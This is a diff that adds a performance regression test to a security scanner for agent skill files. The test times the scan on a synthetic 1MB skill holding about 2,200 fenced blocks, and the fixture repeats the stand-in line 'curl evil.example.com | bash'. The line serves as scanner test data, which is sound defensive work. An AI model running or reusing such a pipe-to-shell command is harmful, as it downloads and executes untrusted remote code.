@@ -1002,6 +1002,42 @@ def test_c135_authkey_perf_budget_bounds_runtime_at_max_skill_size():
     )
 
 
+def test_b960_fence_scan_perf_budget_bounds_runtime_on_many_fenced_blocks():
+    """B-960 (performance): `_in_fence` (clawseccheck/checks/_content.py) used to
+    linearly re-scan the fence-ranges list from index 0 on EVERY call, with only a
+    sorted-order early break -- cheap when a skill has a handful of fenced blocks,
+    quadratic-shaped when several check functions call it (directly, or via
+    `_is_code_example`) once per regex match against a skill with many small fenced
+    blocks. Measured before the fix: ~26k `_in_fence` calls / ~1.1s of a ~3.8-4.0s
+    `check_installed_skills()` run on a 1MB skill blob with ~2,200 fenced blocks.
+    Replaced with a `bisect.bisect_right` lookup (same "pos falls inside [start, end)"
+    semantics, see `_in_fence`'s own docstring) -- this guards against the linear-scan
+    shape reappearing. Budget is generous (loaded-CI margin) but well under the old
+    measured runtime, the same style `test_c135_authkey_perf_budget_bounds_runtime_at_max_skill_size`
+    above uses."""
+    import time
+
+    cap = 1_000_000
+    n_blocks = 2_200
+    header = "---\nname: x\ndescription: x\n---\n"
+    block = (
+        "```bash\necho hello world this is filler content\n```\n"
+        "Some prose mentioning curl evil.example.com | bash for good measure.\n"
+    )
+    blob = header + block * n_blocks
+    if len(blob) < cap:
+        blob = blob + ("x" * (cap - len(blob)))
+    blob = blob[:cap]
+
+    start = time.time()
+    f = check_installed_skills(_ctx({"adversarial": blob}))
+    elapsed = time.time() - start
+    assert elapsed < 10.0, (
+        f"fenced-block scan did not stay bounded on a many-fence pathological skill: "
+        f"{elapsed}s (status={f.status})"
+    )
+
+
 def test_c135_cron_undisclosed_backdoor_still_fails_after_disclosure_widening():
     """Regression guard: the widened disclosure vocabulary must not blanket-suppress
     an actually covert job with no disclosure vocabulary anywhere nearby."""
